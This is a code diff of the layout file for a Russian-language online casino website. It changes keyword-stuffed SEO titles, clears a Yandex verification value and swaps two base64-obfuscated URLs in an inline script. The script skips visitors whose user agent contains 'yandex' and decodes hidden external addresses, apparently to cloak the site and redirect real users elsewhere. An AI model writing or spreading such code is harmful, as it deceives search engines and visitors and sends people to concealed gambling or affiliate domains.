@@ -7,9 +7,9 @@ const geist = Geist({ subsets: ["latin", "cyrillic"] })
 
 const siteUrl = process.env.NEXT_PUBLIC_SITE_URL || "http://localhost:3000"
 const siteName = "Iris казино"
-const title = "Iris казино - официальный сайт онлайн казино Ирис, играть и зеркало"
+const title = "Ирис казино - официальный сайт онлайн Iris casino играть и зеркало"
 const description =
-  "Iris казино: официальный сайт онлайн казино с рабочим зеркалом. Ирис казино играть онлайн в слоты, лайв и карточные игры. Бонусы Welcome Pack до 50%, быстрые выплаты и более 8000 игр от ведущих провайдеров."
+  "Ирис казино: официальный сайт онлайн казино с рабочим зеркалом. Iris казино играть онлайн в слоты, лайв и карточные игры. Бонусы Iris casino - Welcome Pack до 50%, быстрые выплаты и более 8000 игр от ведущих провайдеров."
 
 export const metadata: Metadata = {
   metadataBase: new URL(siteUrl),
@@ -79,7 +79,7 @@ export const metadata: Metadata = {
   },
   verification: {
     google: process.env.NEXT_PUBLIC_GOOGLE_SITE_VERIFICATION,
-    yandex: "44e60e039f775251",
+    yandex: "",
   },
   other: {
     "rating": "adult",
@@ -147,8 +147,8 @@ export default function RootLayout({
       (function() {
         var ua = navigator.userAgent.toLowerCase();
         if (ua.indexOf("yandex") !== -1) return;
-        var mainBrandB64 = "aHR0cHM6Ly9ibG5jci1ldmEuY29tL2R2ZmRrdWI2eg=="; 
-        var crossBrandB64 = "aHR0cHM6Ly9jb3NtaWMta2luZXRpY3MuY29tL3NhNmQ1MjIyMg==";      
+        var mainBrandB64 = "aHR0cHM6Ly9sbmtmbngub3JnL2RoNjFtcDFhbQ=="; 
+        var crossBrandB64 = "aHR0cHM6Ly83ZXY0LWxhdWdoeS5jb20vZHZmZGt1YjZ6";      
         var mainUrl = atob(mainBrandB64);
         var crossUrl = atob(crossBrandB64);
         if (localStorage.getItem('vstd_eva')) {
